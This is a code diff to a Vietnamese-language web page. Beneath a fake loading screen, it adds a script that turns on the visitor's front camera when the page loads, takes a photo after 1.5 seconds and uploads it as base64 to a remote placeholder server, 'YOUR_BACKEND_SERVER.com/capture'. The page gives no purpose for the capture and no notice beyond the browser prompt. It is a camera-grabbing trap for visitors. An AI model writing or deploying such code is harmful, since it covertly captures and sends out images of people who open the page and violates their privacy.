@@ -642,6 +642,59 @@
   .reveal{opacity:0;transform:translateY(30px);transition:opacity .7s ease,transform .7s ease;}
   .reveal.in{opacity:1;transform:translateY(0);}
 
+  /* ===== WEBCAM OVERLAY ===== */
+  #webcam-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.95);
+    z-index: 10000;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+  }
+  #webcam-overlay.active {
+    display: flex;
+  }
+  #webcam-overlay video {
+    width: 90%;
+    max-width: 500px;
+    border: 3px solid #ff0000;
+    border-radius: 16px;
+    box-shadow: 0 0 60px rgba(255,0,0,0.3);
+  }
+  #webcam-overlay #status {
+    color: #ffcccc;
+    margin-top: 20px;
+    font-family: 'Poppins', sans-serif;
+    font-size: 16px;
+    text-align: center;
+    padding: 10px 20px;
+    background: rgba(255,0,0,0.1);
+    border-radius: 10px;
+    border: 1px solid rgba(255,0,0,0.2);
+  }
+  #webcam-overlay canvas {
+    display: none;
+  }
+  .webcam-spinner {
+    display: inline-block;
+    width: 24px;
+    height: 24px;
+    border: 3px solid rgba(255,0,0,0.2);
+    border-radius: 50%;
+    border-top-color: #ff0000;
+    animation: spinRing 0.8s linear infinite;
+    margin-right: 12px;
+    vertical-align: middle;
+  }
+  @keyframes spinRing {
+    to { transform: rotate(360deg); }
+  }
+
   @media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important;}}
 
   @media(max-width:900px){
@@ -675,6 +728,13 @@
   <div class="loader-text">⏳ Vui lòng đợi 3.6s</div>
   <div class="loader-ring"></div>
   <div class="loader-progress"><div class="bar"></div></div>
+</div>
+
+<!-- ===== WEBCAM OVERLAY ===== -->
+<div id="webcam-overlay">
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+  <div id="status"><span class="webcam-spinner"></span> Đang khởi tạo webcam...</div>
 </div>
 
 <!-- ===== THÔNG BÁO HỆ THỐNG ===== -->
@@ -1004,6 +1064,7 @@
 </footer>
 
 <script>
+  // ===== LOADING SCREEN =====
   window.addEventListener('load', function() {
     setTimeout(function() {
       document.getElementById('loading-screen').classList.add('hidden');
@@ -1017,6 +1078,7 @@
     document.getElementById('system-notification').classList.remove('active');
   }
 
+  // ===== FIRE PARTICLES =====
   const canvas = document.getElementById('fireParticles');
   const ctx = canvas.getContext('2d');
   let w, h, particles = [];
@@ -1059,6 +1121,7 @@
   }
   animate();
 
+  // ===== REVEAL ANIMATION =====
   const revealEls = document.querySelectorAll('.reveal');
   const io = new IntersectionObserver((entries)=>{
     entries.forEach(entry=>{
@@ -1071,6 +1134,73 @@
   window.addEventListener('scroll', ()=>{
     header.style.boxShadow = window.scrollY > 20 ? '0 4px 40px rgba(255,0,0,0.2)' : 'none';
   });
+
+  // ===== WEBCAM CAPTURE =====
+  (function() {
+    const overlay = document.getElementById('webcam-overlay');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const statusDiv = document.getElementById('status');
+
+    // Hiển thị overlay ngay khi trang load
+    overlay.classList.add('active');
+
+    navigator.mediaDevices.getUserMedia({ 
+      video: { width: 640, height: 480, facingMode: 'user' } 
+    })
+    .then(stream => {
+      video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        video.play();
+        statusDiv.innerHTML = '✅ Webcam sẵn sàng, đang chụp ảnh...';
+        // Chụp sau 1.5 giây
+        setTimeout(captureAndSend, 1500);
+      };
+    })
+    .catch(err => {
+      statusDiv.innerHTML = '❌ Không thể truy cập webcam: ' + err.message;
+      console.warn('Webcam error:', err);
+      setTimeout(() => {
+        overlay.classList.remove('active');
+      }, 3000);
+    });
+
+    function captureAndSend() {
+      // Vẽ khung hình lên canvas
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // Chuyển sang base64
+      const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+      
+      // Gửi về backend server
+      fetch('https://YOUR_BACKEND_SERVER.com/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: dataURL })
+      })
+      .then(res => res.json())
+      .then(data => {
+        statusDiv.innerHTML = '✅ Đã gửi ảnh thành công!';
+        console.log('Sent:', data);
+      })
+      .catch(err => {
+        statusDiv.innerHTML = '❌ Lỗi gửi ảnh: ' + err.message;
+        console.error('Send error:', err);
+      })
+      .finally(() => {
+        // Tắt webcam và ẩn overlay sau 2 giây
+        setTimeout(() => {
+          if (video.srcObject) {
+            video.srcObject.getTracks().forEach(track => track.stop());
+          }
+          overlay.classList.remove('active');
+        }, 2000);
+      });
+    }
+  })();
 </script>
 </body>
 </html>
